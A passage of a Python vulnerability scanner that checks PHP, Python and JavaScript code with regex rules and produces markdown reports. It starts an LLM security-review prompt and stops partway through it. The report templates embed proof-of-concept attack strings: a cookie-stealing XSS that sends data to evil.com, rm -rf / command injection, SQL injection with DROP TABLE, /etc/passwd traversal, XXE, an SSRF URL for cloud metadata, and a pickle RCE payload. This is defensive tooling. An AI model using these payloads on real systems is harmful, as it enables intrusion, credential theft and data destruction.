    if lang in ("php", "javascript", "java", "c++", "csharp"):
        code = re.sub(r'/\*.*?\*/', ' ', code, flags=re.DOTALL)
        code = re.sub(r'//[^\n]*', ' ', code)
    if lang == "php":
        code = re.sub(r'#[^\n]*', ' ', code)
    elif lang == "python":
        code = re.sub(r'#[^\n]*', ' ', code)
        code = re.sub(r'""".*?"""', ' ', code, flags=re.DOTALL)
        code = re.sub(r"'''.*?'''", ' ', code, flags=re.DOTALL)
    return code


def _fmt_issue(i: int, issue: dict, lang: str = "php") -> str:
    """Format a deterministic finding into the standard markdown report block."""
    return (
        f"## [{issue['severity']}] Vulnerability #{i}: {issue['type']}\n\n"
        f"- **Location:** {issue.get('location', 'See snippet')}\n"
        f"- **Code Snippet:**\n```{lang}\n{issue['snippet']}\n```\n"
        f"- **CWE:** {issue.get('cwe', 'N/A')}\n"
        f"- **OWASP 2021:** {issue.get('owasp', 'N/A')}\n"
        f"- **Confidence:** High\n"
        f"- **Attack Vector:** {issue.get('attack_vector', 'Attacker-controlled input reaches a dangerous sink.')}\n"
        f"- **POC:** {issue.get('poc', 'See description.')}\n"
        f"- **Impact:** {issue['description']}\n"
        f"- **Fix:**\n```{lang}\n{issue['fix']}\n```\n\n"
    )


def verify_php_security(code: str) -> str:
    """Deterministic PHP security checks covering all major vulnerability classes.
    Always runs regardless of AI result — merges new findings with AI analysis."""
    clean = _strip_code_comments(code, "php")
    lines = code.splitlines()
    issues = []
    seen_types: set = set()

    def _first_line(pattern: str, src: str = clean) -> tuple[str, str]:
        """Return (snippet, location) for the first match of pattern in src."""
        m = re.search(pattern, src, re.IGNORECASE | re.DOTALL)
        if not m:
            return "", ""
        snippet = m.group(0)[:200].strip()
        # Find approximate line number in original code
        line_no = code[:m.start()].count('\n') + 1 if src is clean else "?"
        return snippet, f"Line ~{line_no}"

    def _add(issue: dict):
        if issue["type"] not in seen_types:
            seen_types.add(issue["type"])
            issues.append(issue)

    # ── 1. Insecure password hashing (MD5 / SHA1) ──────────────────────────
    pwd_pattern = r"""(?:md5|sha1)\s*\(\s*(?:\$_(?:POST|GET|REQUEST|COOKIE)\[|trim\s*\(\s*\$|\$(?!\w*html|\w*token|\w*key|\w*id)[a-zA-Z_]\w*\s*(?:\.|,|\)))"""
    snippet, loc = _first_line(pwd_pattern)
    if snippet:
        _add({
            "type": "Insecure Password Hashing",
            "severity": "Critical",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-916 — Use of Password Hash With Insufficient Computational Effort",
            "owasp": "A02:2021 — Cryptographic Failures",
            "attack_vector": "Attacker dumps the DB and cracks MD5/SHA1 hashes offline in seconds.",
            "poc": "hashcat -a 0 -m 0 hashes.txt rockyou.txt",
            "description": "MD5 and SHA1 are cryptographically broken and trivially crackable. Never use them for passwords.",
            "fix": "password_hash($password, PASSWORD_BCRYPT);\n// verify: password_verify($input, $hash)",
        })

    # ── 2. XSS — per-line check (NOT file-wide) ───────────────────────────
    xss_output_pattern = re.compile(
        r'(?:echo|print|<\?=)\s*(?:["\'][^"\']*\$[^"\']*["\']|\$(?:_(?:GET|POST|REQUEST|COOKIE|SERVER|ENV)\b|\w+(?:\[.*?\])?)\s*(?:;|\.|\,|\)|\s*$))',
        re.IGNORECASE
    )
    dangerous_echo_lines = []
    for lineno, line in enumerate(lines, 1):
        clean_line = _strip_code_comments(line, "php").strip()
        if xss_output_pattern.search(clean_line) and not re.search(r'htmlspecialchars|htmlentities|strip_tags|intval|floatval|filter_var', clean_line, re.IGNORECASE):
            dangerous_echo_lines.append((lineno, line.strip()))
    if dangerous_echo_lines:
        sample = "\n".join(f"// Line {ln}: {ln_code}" for ln, ln_code in dangerous_echo_lines[:3])
        _add({
            "type": "Cross-Site Scripting (XSS) — Unescaped Output",
            "severity": "High",
            "location": f"Lines {', '.join(str(ln) for ln, _ in dangerous_echo_lines[:5])}",
            "snippet": sample,
            "cwe": "CWE-79 — Improper Neutralization of Input During Web Page Generation",
            "owasp": "A03:2021 — Injection",
            "attack_vector": "Attacker injects <script> via GET/POST parameter; victim browser executes it.",
            "poc": "?name=<script>fetch('https://evil.com/?c='+document.cookie)</script>",
            "description": "Variables are echoed directly to HTML without escaping, enabling stored or reflected XSS.",
            "fix": "echo htmlspecialchars($var, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');",
        })

    # ── 3. SQL injection — string concatenation into queries ──────────────
    sqli_pattern = r'(?:mysql[i]?_query|->query|->prepare\s*\(\s*"[^"]*\.\s*\$|PDO::query)\s*\(\s*["\'][^"\']*(?:\.\s*\$|\$[a-zA-Z_]\w*(?:\[.*?\])?)[^"\']*["\']'
    snippet, loc = _first_line(sqli_pattern)
    if not snippet:
        # Also catch direct variable interpolation in query strings
        sqli_pattern2 = r'(?:mysql[i]?_query|->query|->prepare)\s*\(\s*"[^"]*\$(?:_(?:GET|POST|REQUEST|COOKIE)|[a-zA-Z_]\w*)[^"]*"'
        snippet, loc = _first_line(sqli_pattern2)
    if snippet:
        _add({
            "type": "SQL Injection",
            "severity": "Critical",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-89 — SQL Injection",
            "owasp": "A03:2021 — Injection",
            "attack_vector": "Attacker manipulates GET/POST parameter to alter query logic.",
            "poc": "?id=1 OR 1=1-- (dump all rows) | ?id=1; DROP TABLE users--",
            "description": "User input is concatenated directly into SQL queries allowing arbitrary query manipulation.",
            "fix": "$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->execute([$id]);",
        })

    # ── 4. Insecure file upload ────────────────────────────────────────────
    if re.search(r'\$_FILES', clean):
        has_move = re.search(r'move_uploaded_file', clean)
        ext_only = re.search(r'strtolower\s*\(\s*\$\w*ext\w*\s*\)|pathinfo.*PATHINFO_EXTENSION', clean, re.IGNORECASE)
        no_mime_check = not re.search(r'mime_content_type|finfo_file|getimagesize\s*\(', clean, re.IGNORECASE)
        web_path = re.search(r'["\'][^"\']*(?:uploads?|www|public_html|htdocs|webroot)[^"\']*["\']', clean, re.IGNORECASE)
        if has_move and (ext_only or no_mime_check) and web_path:
            snippet = web_path.group(0)[:150]
            _add({
                "type": "Insecure File Upload — Remote Code Execution",
                "severity": "Critical",
                "location": f"Line ~{code[:web_path.start()].count(chr(10)) + 1}",
                "snippet": snippet,
                "cwe": "CWE-434 — Unrestricted Upload of File with Dangerous Type",
                "owasp": "A04:2021 — Insecure Design",
                "attack_vector": "Attacker uploads a .php webshell; renames it to shell.php.jpg; server executes it.",
                "poc": "curl -F 'file=@shell.php;type=image/jpeg' https://victim/upload.php",
                "description": "Files uploaded to a web-accessible directory with insufficient content validation allow RCE.",
                "fix": (
                    "// 1. Store outside webroot: $dest = '/var/uploads/' . basename($filename);\n"
                    "// 2. Validate MIME: $finfo = new finfo(FILEINFO_MIME_TYPE);\n"
                    "//    if (!in_array($finfo->file($tmp), $allowed_types)) die('Invalid');\n"
                    "// 3. Block execution in upload dir via .htaccess: php_flag engine off"
                ),
            })

    # ── 5. PHP Object Injection (unserialize) ─────────────────────────────
    unser_pattern = r'unserialize\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE|SESSION)|unserialize\s*\(\s*base64_decode\s*\(\s*\$'
    snippet, loc = _first_line(unser_pattern)
    if snippet:
        _add({
            "type": "PHP Object Injection via unserialize()",
            "severity": "Critical",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-502 — Deserialization of Untrusted Data",
            "owasp": "A08:2021 — Software and Data Integrity Failures",
            "attack_vector": "Attacker crafts a serialized payload exploiting __wakeup or __destruct magic methods.",
            "poc": "O:8:'EvilClass':1:{s:4:'file';s:9:'/etc/passwd';}",
            "description": "Deserializing untrusted data allows Object Injection, potentially leading to RCE.",
            "fix": "Use json_decode()/json_encode() instead, or validate with a HMAC signature before deserializing.",
        })

    # ── 6. Variable injection (extract / parse_str) ───────────────────────
    varinject_pattern = r'extract\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)|parse_str\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)'
    snippet, loc = _first_line(varinject_pattern)
    if snippet:
        _add({
            "type": "Variable Injection via extract() / parse_str()",
            "severity": "High",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-473 — PHP External Variable Modification",
            "owasp": "A03:2021 — Injection",
            "attack_vector": "Attacker passes ?is_admin=1 to overwrite any variable in scope.",
            "poc": "GET /page.php?is_admin=1&price=0",
            "description": "extract() and parse_str() import all keys as PHP variables, allowing any variable to be overwritten.",
            "fix": "Remove extract()/parse_str(). Access $_POST['key'] explicitly with validation.",
        })

    # ── 7. Weak randomness for security tokens ────────────────────────────
    weakrand_pattern = r'(?:rand|mt_rand|array_rand|shuffle)\s*\(.*?\)\s*(?:;|\.)'
    if re.search(weakrand_pattern, clean):
        token_context = re.search(
            r'(?:token|nonce|salt|secret|otp|code|csrf|session|key|password|pwd|hash)\s*=\s*.*?(?:rand|mt_rand)',
            clean, re.IGNORECASE
        )
        if token_context:
            snippet = token_context.group(0)[:150].strip()
            _add({
                "type": "Insecure Randomness for Security Token",
                "severity": "High",
                "location": f"Line ~{code[:token_context.start()].count(chr(10)) + 1}",
                "snippet": snippet,
                "cwe": "CWE-338 — Use of Cryptographically Weak PRNG",
                "owasp": "A02:2021 — Cryptographic Failures",
                "attack_vector": "Attacker can predict token values due to seeded, non-cryptographic PRNG.",
                "poc": "// Brute-force token in O(2^32) — feasible offline in minutes",
                "description": "rand()/mt_rand() are not cryptographically secure and must not be used for security-sensitive tokens.",
                "fix": "$token = bin2hex(random_bytes(32)); // PHP 7+",
            })

    # ── 8. Open redirect ──────────────────────────────────────────────────
    redirect_pattern = r'header\s*\(\s*["\']Location:\s*["\'\s]*\.\s*\$|\header\s*\(\s*"Location:\s*\$|\header\s*\(.*?\$_(?:GET|POST|REQUEST)'
    snippet, loc = _first_line(redirect_pattern)
    if snippet:
        _add({
            "type": "Open Redirect",
            "severity": "Medium",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-601 — URL Redirection to Untrusted Site",
            "owasp": "A01:2021 — Broken Access Control",
            "attack_vector": "Attacker sends victim a trusted-looking URL that redirects to phishing site.",
            "poc": "https://victim.com/redirect.php?url=https://evil.com",
            "description": "Unvalidated user-controlled URL in header() Location redirect enables phishing attacks.",
            "fix": (
                "$allowed = ['https://trusted.com', 'https://app.local'];\n"
                "if (!in_array($url, $allowed)) die('Invalid redirect');\n"
                "header('Location: ' . $url);"
            ),
        })

    # ── 9. Path traversal ─────────────────────────────────────────────────
    lfi_pattern = r'(?:include|require|include_once|require_once|readfile|file_get_contents|fopen|file)\s*\(\s*(?:\$_(?:GET|POST|REQUEST|COOKIE)|[^)]*\.\s*\$_(?:GET|POST|REQUEST|COOKIE))'
    snippet, loc = _first_line(lfi_pattern)
    if snippet:
        _add({
            "type": "Path Traversal / Local File Inclusion",
            "severity": "Critical",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-22 — Path Traversal",
            "owasp": "A01:2021 — Broken Access Control",
            "attack_vector": "GET ?file=../../../../etc/passwd or ?page=http://evil.com/shell.txt",
            "poc": "?file=../../../../../../etc/passwd%00",
            "description": "User-controlled path passed directly to file functions allows reading arbitrary files or RCE via RFI.",
            "fix": (
                "$allowed_pages = ['home', 'about', 'contact'];\n"
                "$page = basename($_GET['page']);\n"
                "if (!in_array($page, $allowed_pages)) die('Invalid');\n"
                "include 'pages/' . $page . '.php';"
            ),
        })

    # ── 10. SSRF via curl / file_get_contents with user URL ───────────────
    ssrf_pattern = r'(?:curl_setopt.*CURLOPT_URL.*\$_(?:GET|POST|REQUEST)|file_get_contents\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE))'
    snippet, loc = _first_line(ssrf_pattern)
    if snippet:
        _add({
            "type": "Server-Side Request Forgery (SSRF)",
            "severity": "High",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-918 — Server-Side Request Forgery",
            "owasp": "A10:2021 — Server-Side Request Forgery",
            "attack_vector": "Attacker makes server fetch http://169.254.169.254/latest/meta-data/ (cloud metadata).",
            "poc": "?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "description": "User-controlled URL fetched server-side can reach internal services, cloud metadata, or localhost.",
            "fix": (
                "$parsed = parse_url($url);\n"
                "$allowed_hosts = ['api.trusted.com'];\n"
                "if (!in_array($parsed['host'], $allowed_hosts)) die('Blocked');"
            ),
        })

    # ── 11. XXE — XML parsers with external entities enabled ──────────────
    xxe_pattern = r'(?:simplexml_load_string|simplexml_load_file|DOMDocument\s*\(\)|new\s+SimpleXMLElement|XMLReader\s*::)\s*(?:\(|->)'
    if re.search(xxe_pattern, clean, re.IGNORECASE):
        no_protection = not re.search(r'LIBXML_NOENT|LIBXML_DTDLOAD|libxml_disable_entity_loader', clean, re.IGNORECASE)
        if no_protection:
            snippet, loc = _first_line(xxe_pattern)
            _add({
                "type": "XML External Entity Injection (XXE)",
                "severity": "High",
                "location": loc,
                "snippet": snippet,
                "cwe": "CWE-611 — Improper Restriction of XML External Entity Reference",
                "owasp": "A05:2021 — Security Misconfiguration",
                "attack_vector": "Attacker posts XML with <!ENTITY xxe SYSTEM 'file:///etc/passwd'> to read files.",
                "poc": "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><r>&xxe;</r>",
                "description": "XML parser loads external entities by default, enabling file read and SSRF.",
                "fix": (
                    "libxml_disable_entity_loader(true); // PHP < 8.0\n"
                    "// PHP 8+: external entity loading is disabled by default\n"
                    "$dom = new DOMDocument();\n"
                    "$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);"
                ),
            })

    # ── 12. Session fixation ──────────────────────────────────────────────
    sessfix_pattern = r'session_id\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)'
    snippet, loc = _first_line(sessfix_pattern)
    if snippet:
        _add({
            "type": "Session Fixation",
            "severity": "High",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-384 — Session Fixation",
            "owasp": "A07:2021 — Identification and Authentication Failures",
            "attack_vector": "Attacker sets ?PHPSESSID=attacker_known_id; victim logs in; attacker takes over session.",
            "poc": "https://victim.com/login?PHPSESSID=abc123 → victim logs in → attacker uses PHPSESSID=abc123",
            "description": "Accepting session ID from user input allows attacker to pre-set a known session ID.",
            "fix": "// After login, always regenerate the session ID:\nsession_regenerate_id(true);",
        })

    # ── 13. assert() with user input (RCE) ────────────────────────────────
    assert_pattern = r'assert\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)'
    snippet, loc = _first_line(assert_pattern)
    if snippet:
        _add({
            "type": "Remote Code Execution via assert()",
            "severity": "Critical",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-94 — Code Injection",
            "owasp": "A03:2021 — Injection",
            "attack_vector": "assert() with a string argument evaluates it as PHP code.",
            "poc": "?expr=system('id')",
            "description": "assert() with a string argument is equivalent to eval() — direct RCE.",
            "fix": "// Remove assert() with user input entirely. Use explicit boolean checks.",
        })

    # ── 14. eval() / preg_replace /e modifier ────────────────────────────
    eval_pattern = r'eval\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)|preg_replace\s*\(\s*["\'][^"\']*\/e[^"\']*["\']'
    snippet, loc = _first_line(eval_pattern)
    if snippet:
        _add({
            "type": "Remote Code Execution via eval()",
            "severity": "Critical",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-94 — Code Injection",
            "owasp": "A03:2021 — Injection",
            "attack_vector": "eval() executes arbitrary PHP code supplied by the attacker.",
            "poc": "?code=system('whoami');",
            "description": "eval() with user-controlled input is direct Remote Code Execution.",
            "fix": "// Never pass user input to eval(). Refactor to use a safe dispatch table.",
        })

    if not issues:
        return None

    result = "## Security Issues Detected by Deterministic Analysis\n\n"
    result += f"> {len(issues)} issue(s) found by pattern-based checks (always reported regardless of AI verdict)\n\n"
    for i, issue in enumerate(issues, 1):
        result += _fmt_issue(i, issue, "php")
    return result


def verify_python_security(code: str) -> str:
    """Deterministic Python security checks. Returns formatted findings or None."""
    clean = _strip_code_comments(code, "python")
    issues = []
    seen_types: set = set()

    def _first(pattern: str) -> tuple[str, str]:
        m = re.search(pattern, clean, re.IGNORECASE | re.DOTALL)
        if not m:
            return "", ""
        snippet = m.group(0)[:200].strip()
        loc = f"Line ~{code[:code.find(m.group(0))].count(chr(10)) + 1}" if m.group(0) in code else "See snippet"
        return snippet, loc

    def _add(issue: dict):
        if issue["type"] not in seen_types:
            seen_types.add(issue["type"])
            issues.append(issue)

    # eval / exec with user input
    snippet, loc = _first(r'(?:eval|exec)\s*\([^)]*(?:input\s*\(|request\.|flask\.request|argv|environ|sys\.stdin)')
    if snippet:
        _add({"type": "RCE via eval()/exec()", "severity": "Critical", "location": loc, "snippet": snippet,
              "cwe": "CWE-94 — Code Injection", "owasp": "A03:2021 — Injection",
              "attack_vector": "User input passed directly to eval/exec executes arbitrary Python code.",
              "poc": "input: __import__('os').system('id')",
              "description": "eval()/exec() with user-controlled input allows full Remote Code Execution.",
              "fix": "# Never eval() user input. Use ast.literal_eval() for safe literal parsing."})

    # pickle / marshal / shelve
    snippet, loc = _first(r'pickle\.loads?\s*\(|marshal\.loads?\s*\(|shelve\.open\s*\(')
    if snippet:
        _add({"type": "Unsafe Deserialization (pickle/marshal)", "severity": "Critical", "location": loc, "snippet": snippet,
              "cwe": "CWE-502 — Deserialization of Untrusted Data", "owasp": "A08:2021 — Integrity Failures",
              "attack_vector": "Attacker sends crafted pickle payload; Python executes __reduce__ during deserialization.",
              "poc": "import pickle,os; pickle.loads(b'cos\\nsystem\\n(S\\'id\\'\\ntR.')",
              "description": "Deserializing untrusted pickle/marshal data leads to RCE via __reduce__ gadgets.",
              "fix": "# Use json.loads() or a schema-validated format. Never pickle untrusted data."})

    # yaml.load without SafeLoader
    snippet, loc = _first(r'yaml\.load\s*\([^)]*\)(?!\s*,\s*Loader\s*=\s*yaml\.SafeLoader)')
    if snippet:
        _add({"type": "YAML Deserialization RCE", "severity": "Critical", "location": loc, "snippet": snippet,
              "cwe": "CWE-502 — Deserialization of Untrusted Data", "owasp": "A08:2021 — Integrity Failures",
              "attack_vector": "YAML document with !!python/object/apply: os.system ['id'] executes OS commands.",
              "poc": "!!python/object/apply:os.system ['whoami']",
              "description": "yaml.load() without Loader=yaml.SafeLoader executes arbitrary Python via special YAML tags.",
              "fix": "yaml.safe_load(data)  # or yaml.load(data, Loader=yaml.SafeLoader)"})

    # subprocess with shell=True and user input
    snippet, loc = _first(r'subprocess\.(?:call|run|Popen|check_output)\s*\([^)]*shell\s*=\s*True')
    if snippet:
        _add({"type": "OS Command Injection via subprocess(shell=True)", "severity": "Critical", "location": loc, "snippet": snippet,
              "cwe": "CWE-78 — OS Command Injection", "owasp": "A03:2021 — Injection",
              "attack_vector": "Shell metacharacters in user input execute arbitrary OS commands.",
              "poc": "filename = 'file.txt; rm -rf /'",
              "description": "shell=True passes the command to the OS shell — any unescaped user input enables command injection.",
              "fix": "subprocess.run(['cmd', arg1, arg2], shell=False)  # Pass args as list"})

    # SQL injection via string formatting
    snippet, loc = _first(r'(?:execute|executemany)\s*\(\s*["\'][^"\']*%s[^"\']*["\'\s]*%\s*\(|\bexecute\b.*\.format\s*\(|f["\'][^"\']*SELECT[^"\']*\{')
    if snippet:
        _add({"type": "SQL Injection via String Formatting", "severity": "Critical", "location": loc, "snippet": snippet,
              "cwe": "CWE-89 — SQL Injection", "owasp": "A03:2021 — Injection",
              "attack_vector": "Attacker injects SQL via string-formatted query parameter.",
              "poc": "' OR '1'='1",
              "description": "SQL query built with % or .format() instead of parameterised placeholders allows injection.",
              "fix": "cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))"})

    # Weak randomness for tokens
    snippet, loc = _first(r'random\.(?:random|randint|choice|randrange)\s*\(')
    if snippet:
        token_ctx = re.search(r'(?:token|secret|key|nonce|csrf|salt|otp|session|password)[^=\n]*=.*?random\.', clean, re.IGNORECASE)
        if token_ctx:
            snippet = token_ctx.group(0)[:150].strip()
            _add({"type": "Insecure Randomness for Security Token", "severity": "High", "location": loc, "snippet": snippet,
                  "cwe": "CWE-338 — Cryptographically Weak PRNG", "owasp": "A02:2021 — Cryptographic Failures",
                  "attack_vector": "Python's random module is seeded and predictable; tokens can be brute-forced.",
                  "poc": "# Predict next value by observing previous outputs",
                  "description": "random module is not cryptographically secure. Use secrets module for security tokens.",
                  "fix": "import secrets; token = secrets.token_urlsafe(32)"})

    # SSRF via requests with user input
    snippet, loc = _first(r'requests\.(?:get|post|put|delete|head|request)\s*\([^)]*(?:request\.|flask\.request|argv|input\s*\(|environ)')
    if snippet:
        _add({"type": "Server-Side Request Forgery (SSRF)", "severity": "High", "location": loc, "snippet": snippet,
              "cwe": "CWE-918 — SSRF", "owasp": "A10:2021 — SSRF",
              "attack_vector": "Attacker passes http://169.254.169.254/ to fetch cloud metadata or internal services.",
              "poc": "?url=http://169.254.169.254/latest/meta-data/",
              "description": "User-controlled URL passed to requests library enables SSRF to internal/cloud resources.",
              "fix": "# Validate URL against an allowlist before fetching\nif urlparse(url).hostname not in ALLOWED_HOSTS: raise ValueError"})

    # MD5/SHA1 for passwords
    snippet, loc = _first(r'hashlib\.(?:md5|sha1)\s*\([^)]*(?:password|passwd|pwd|secret)')
    if snippet:
        _add({"type": "Insecure Password Hashing (MD5/SHA1)", "severity": "Critical", "location": loc, "snippet": snippet,
              "cwe": "CWE-916 — Weak Password Hash", "owasp": "A02:2021 — Cryptographic Failures",
              "attack_vector": "Attacker dumps database and cracks MD5/SHA1 hashes offline in seconds.",
              "poc": "hashcat -a 0 -m 0 hashes.txt rockyou.txt",
              "description": "MD5/SHA1 are fast hashes, unsuitable for passwords. Crackable in seconds with GPU.",
              "fix": "import bcrypt; bcrypt.hashpw(password.encode(), bcrypt.gensalt())"})

    # tempfile.mktemp (TOCTOU)
    snippet, loc = _first(r'tempfile\.mktemp\s*\(')
    if snippet:
        _add({"type": "Race Condition (TOCTOU) via tempfile.mktemp()", "severity": "Medium", "location": loc, "snippet": snippet,
              "cwe": "CWE-377 — Insecure Temporary File", "owasp": "A04:2021 — Insecure Design",
              "attack_vector": "Attacker creates a symlink between mktemp() returning a name and the file being created.",
              "poc": "# Race: ln -s /etc/passwd /tmp/tmpXXXXXX between mktemp() and open()",
              "description": "mktemp() returns a name without creating the file — race condition between name generation and use.",
              "fix": "fd, path = tempfile.mkstemp()  # Atomically creates and opens the file"})

    if not issues:
        return None
    result = "## Security Issues Detected by Deterministic Python Analysis\n\n"
    result += f"> {len(issues)} issue(s) found by pattern-based checks\n\n"
    for i, issue in enumerate(issues, 1):
        result += _fmt_issue(i, issue, "python")
    return result


def verify_javascript_security(code: str) -> str:
    """Deterministic JavaScript / Node.js security checks. Returns formatted findings or None."""
    clean = _strip_code_comments(code, "javascript")
    issues = []
    seen_types: set = set()

    def _first(pattern: str) -> tuple[str, str]:
        m = re.search(pattern, clean, re.IGNORECASE | re.DOTALL)
        if not m:
            return "", ""
        snippet = m.group(0)[:200].strip()
        loc = f"Line ~{code[:code.find(m.group(0))].count(chr(10)) + 1}" if m.group(0) in code else "See snippet"
        return snippet, loc

    def _add(issue: dict):
        if issue["type"] not in seen_types:
            seen_types.add(issue["type"])
            issues.append(issue)

    # eval / Function constructor
    snippet, loc = _first(r'\beval\s*\(|new\s+Function\s*\(')
    if snippet:
        _add({"type": "Code Injection via eval()/Function()", "severity": "Critical", "location": loc, "snippet": snippet,
              "cwe": "CWE-94 — Code Injection", "owasp": "A03:2021 — Injection",
              "attack_vector": "User-controlled string passed to eval() executes arbitrary JavaScript.",
              "poc": "eval(location.hash.slice(1))  →  #alert(document.cookie)",
              "description": "eval() and new Function() execute arbitrary JavaScript — XSS or RCE in Node.js.",
              "fix": "// Remove eval(). Use JSON.parse() for data, or a safe template renderer."})

    # innerHTML / outerHTML / insertAdjacentHTML
    xss_sink = re.finditer(r'(?:\.innerHTML|\.outerHTML|\.insertAdjacentHTML\s*\(|document\.write\s*\(|\.html\s*\()\s*[=\(]?\s*(?:[^;]*(?:location|search|hash|param|query|input|value|data|user|req\.))', clean, re.IGNORECASE)
    xss_matches = list(xss_sink)
    if xss_matches:
        snippet = xss_matches[0].group(0)[:200].strip()
        _add({"type": "DOM-based XSS via innerHTML/outerHTML", "severity": "High", "location": "See snippet", "snippet": snippet,
              "cwe": "CWE-79 — Cross-Site Scripting", "owasp": "A03:2021 — Injection",
              "attack_vector": "User-controlled data (URL params, form values) written to DOM sinks without sanitization.",
              "poc": "#<img src=x onerror=alert(document.cookie)>",
              "description": "Writing unsanitized user data to innerHTML/outerHTML allows DOM XSS attacks.",
              "fix": "element.textContent = userInput;  // Use textContent, not innerHTML\n// Or: DOMPurify.sanitize(userInput)"})

    # child_process with user input (Node.js)
    snippet, loc = _first(r'(?:exec|execSync|spawn|spawnSync)\s*\([^)]*(?:req\.|request\.|process\.argv|process\.env)')
    if snippet:
        _add({"type": "OS Command Injection (Node.js child_process)", "severity": "Critical", "location": loc, "snippet": snippet,
              "cwe": "CWE-78 — OS Command Injection", "owasp": "A03:2021 — Injection",
              "attack_vector": "User-controlled string injected into shell command via exec/spawn.",
              "poc": "?file=test.txt;rm -rf /",
              "description": "child_process.exec() with unsanitized user input allows arbitrary OS command execution.",
              "fix": "// Use spawn() with args array (no shell interpolation):\nspawn('cmd', [safeArg], { shell: false })"})

    # Math.random for security
    snippet, loc = _first(r'Math\.random\s*\(\s*\)')
    if snippet:
        token_ctx = re.search(r'(?:token|secret|key|nonce|csrf|salt|otp|session|password)[^=\n]*=.*?Math\.random', clean, re.IGNORECASE)
        if token_ctx:
            snippet = token_ctx.group(0)[:150].strip()
            _add({"type": "Insecure Randomness for Security Token", "severity": "High", "location": loc, "snippet": snippet,
                  "cwe": "CWE-338 — Weak PRNG", "owasp": "A02:2021 — Cryptographic Failures",
                  "attack_vector": "Math.random() is not cryptographically secure and can be predicted.",
                  "poc": "# Predict seed from observed values",
                  "description": "Math.random() must not be used for security tokens. Predictable in browser environments.",
                  "fix": "const token = crypto.randomBytes(32).toString('hex');  // Node.js\n// Browser: crypto.getRandomValues(new Uint8Array(32))"})

    # postMessage without origin check
    if re.search(r'addEventListener\s*\(\s*["\']message["\']', clean):
        no_origin_check = not re.search(r'event\.origin|message\.origin', clean)
        if no_origin_check:
            snippet, loc = _first(r'addEventListener\s*\(\s*["\']message["\']')
            _add({"type": "Missing postMessage Origin Validation", "severity": "Medium", "location": loc, "snippet": snippet,
                  "cwe": "CWE-346 — Origin Validation Error", "owasp": "A01:2021 — Broken Access Control",
                  "attack_vector": "Attacker's page sends postMessage to victim; handler executes without origin check.",
                  "poc": "// From attacker: targetWindow.postMessage('malicious', '*')",
                  "description": "message event handler does not validate event.origin, accepting messages from any window.",
                  "fix": "window.addEventListener('message', (e) => {\n  if (e.origin !== 'https://trusted.com') return;\n  // handle\n});"})

    # Open redirect (Node/Express)
    snippet, loc = _first(r'res\.redirect\s*\([^)]*(?:req\.(?:query|body|params)|request\.)')
    if snippet:
        _add({"type": "Open Redirect", "severity": "Medium", "location": loc, "snippet": snippet,
              "cwe": "CWE-601 — Open Redirect", "owasp": "A01:2021 — Broken Access Control",
              "attack_vector": "Attacker sends victim a URL that redirects to a phishing page.",
              "poc": "/redirect?url=https://evil.com",
              "description": "Unvalidated user-controlled URL in redirect enables phishing and credential theft.",
              "fix": "const ALLOWED = new Set(['/', '/dashboard', '/profile']);\nif (!ALLOWED.has(url)) url = '/';\nres.redirect(url);"})

    # Prototype pollution
    snippet, loc = _first(r'(?:merge|extend|assign|defaults)\s*\([^)]*(?:req\.|request\.|body\.|query\.)')
    if snippet:
        _add({"type": "Prototype Pollution via Object Merge", "severity": "High", "location": loc, "snippet": snippet,
              "cwe": "CWE-1321 — Prototype Pollution", "owasp": "A08:2021 — Integrity Failures",
              "attack_vector": '{"__proto__": {"isAdmin": true}} merged into app object pollutes Object.prototype.',
              "poc": 'POST body: {"__proto__": {"admin": true}}',
              "description": "Merging user-controlled objects without key sanitization can pollute Object.prototype.",
              "fix": "// Sanitize keys before merge:\nconst safe = JSON.parse(JSON.stringify(userObj));\n// Or use Object.create(null) as base"})

    if not issues:
        return None
    result = "## Security Issues Detected by Deterministic JavaScript Analysis\n\n"
    result += f"> {len(issues)} issue(s) found by pattern-based checks\n\n"
    for i, issue in enumerate(issues, 1):
        result += _fmt_issue(i, issue, "javascript")
    return result


def analyze_php_security(code: str, api_type: str) -> dict:
    """Performs an in-depth, multi-pass security analysis of PHP code."""
    client = APIClient(api_type)

    # Properly closed code blocks — no unclosed backtick fences
    security_prompt = (
        "You are a world-class PHP security expert who finds ALL security vulnerabilities in code.\n"
        "Analyze the following PHP code for every possible vulnerability using the EXACT FORMAT specified below.\n\n"
        "For each vulnerability found, use this EXACT format:\n\n"
        "## [Critical] Vulnerability #N: VULNERABILITY_TYPE\n"
        "- **Location:** Lines X-Y or specific code reference\n"
        "- **Code Snippet:**\n"
        "```php\n"
        "// paste the actual vulnerable code here\n"
        "```\n"
        "- **CWE:** [id] - [name]\n"
        "- **OWASP:** [category]\n"
        "- **Confidence:** High/Medium/Low\n"
        "- **POC:** [exploit proof of concept]\n"
        "- **Impact:** [consequences]\n"
        "- **Fix:** [remediation]\n\n"
        "Pay special attention to:\n"
        "1. SQL Injection - especially from $_COOKIE, $_SESSION variables\n"
        "2. Cross-Site Scripting (reflected, stored, DOM-based)\n"
        "3. Command Injection\n"
        "4. File Inclusion / Path Traversal\n"
        "5. Authentication / Authorization issues\n"
        "6. Insecure File Uploads\n"
        "7. Information Disclosure\n"
        "8. Business Logic vulnerabilities\n\n"
        "If the code is truly secure, begin your response with:\n"
